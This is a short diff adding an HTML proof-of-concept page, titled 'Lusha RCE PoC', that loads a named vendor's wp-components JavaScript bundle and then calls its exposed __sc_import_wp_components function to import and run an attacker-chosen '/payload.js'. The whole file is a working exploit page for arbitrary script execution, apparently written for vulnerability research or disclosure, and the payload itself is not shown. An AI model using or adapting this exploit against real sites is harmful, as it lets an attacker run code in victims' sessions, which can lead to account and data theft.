@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Lusha RCE PoC</title>
+  </head>
+  <body>
+    <h1>Testing RCE via wp-components</h1>
+    <script type="module">
+      const s = document.createElement("script");
+      s.type = "module";
+      s.src = "/lusha/web-portal-components/wp-components/wp-components.esm.js"; // Full path
+      document.head.appendChild(s);
+
+      s.onload = () => {
+        console.log("wp-components loaded");
+
+        // RCE Trigger
+        __sc_import_wp_components("/payload.js")
+          .then(() => {
+            console.log("Payload executed");
+          })
+          .catch((e) => {
+            console.error("Payload failed:", e);
+          });
+      };
+    </script>
+  </body>
+</html>
